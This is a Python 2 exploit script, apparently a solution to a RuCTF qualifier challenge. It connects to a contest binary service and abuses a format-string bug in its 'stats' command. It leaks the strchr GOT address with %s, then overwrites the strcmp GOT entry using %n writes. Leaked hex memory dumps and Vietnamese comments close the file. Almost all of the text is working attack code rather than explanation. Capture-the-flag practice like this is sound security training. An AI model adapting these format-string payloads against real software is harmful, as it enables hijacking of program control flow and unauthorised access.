__author__ = 'HuyNA'
import os
import socket
import time
import struct
import sys
import base64

"""
vuln1.quals.ructf.org:16711 binary
Flag format is "RUCTF_.*".
socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./task
"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Exploit 23.23.190.205:8888 and read flag.txt
host = "vuln1.quals.ructf.org"
local_host="192.168.248.157"
port = 16711
s.connect((host, port))
#s.connect((local_host, 16711))

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

time.sleep(0.01)
#sys.stdin.read(1)
#print "press enter ... "

strchr_address = struct.pack("<I", 0x0804C350)
strcmp_address = struct.pack("<I", 0x0804C2FC)

# lay gia tri cua ham strchr
recv_until(s, "> ")
exploit_string = strchr_address + "%f"*4 + "%s"
command = "stats " + exploit_string + "\n"
s.send(command)
time.sleep(0.01)
data = recv_until(s, "00000001b")
print data
data = recv_until(s, "> ")
print data.encode("hex")
print data
byte1 = int(data[0].encode("hex"), 16) + 20
byte1 = str(byte1)
byte2 = int(data[1].encode("hex"), 16) + 20
byte2 = str(byte2)
byte3 = int(data[2].encode("hex"), 16) + 20
byte3 = str(byte3)
byte4 = int(data[3].encode("hex"), 16) + 20
byte4 = str(byte4)

chr_address = struct.unpack("<I", data[0:4])[0]
print hex(chr_address)
chr_address += 20
chr_address = str(chr_address)
print chr_address
# ghi de dia chi strcmp = strchr
time.sleep(0.01)


exploit_string = "\xfc\xc2\x04\x08" + "\xfd\xc2\x04\x08" + "\xfe\xc2\x04\x08" + "\xff\xc2\x04\x08"+\
                 "%"+byte1+"x%4$n%"+byte2+"x%5$n%"+byte3+"x%6$n%"+byte4+"x%7$n"
exploit_string_2 = "\xfc\xc2\x04\x08" + "%"+chr_address+"x%9$n"
command = "stats " + exploit_string_2 + "\n"
print len(command)
s.send(command)
time.sleep(0.01)
data = recv_until(s, "> ")
print data

# view ket qua
time.sleep(0.01)
command = "rating" + "\n"
s.send(command)
time.sleep(0.01)
data = recv_until(s, "> ")
print data


"""
get dia chi cua ham strchr
    0804C350 strchr
    0804C2FC strcmp
thay = dia chi ham strcmp = ham strchr

xem file ctf co gi

patch 0xbfffec18 "%s%4$n"


0xf75a72d0L
4149900004


0xf764d1d0L
4150579684

d0d164f7
b0f35ef7
809e58f7
40dc58f7
f00b64f7
e0556ff7
e0f463f7
806f57f7
d06757f7
a04b6ff7
e00d61f7
e00e60f7
c0476ff7
b06359f770486ff7309f58f7d09858f7968c0408a68c040870546ff710e357f7d0725af70a0a0a0a0a6b696c6c656420627920746f703a0afcc20408303030303030303162
d0d164f7
b0f35ef7809e58f740dc58f7f00b64f7e0556ff7e0f463f7806f57f7d06757f7a04b6ff7e00d61f7e00e60f7c0476ff7b06359f770486ff7309f58f7d09858f7968c0408a68c040870546ff710e357f7d0725af70a0a0a0a0a3e20


"""
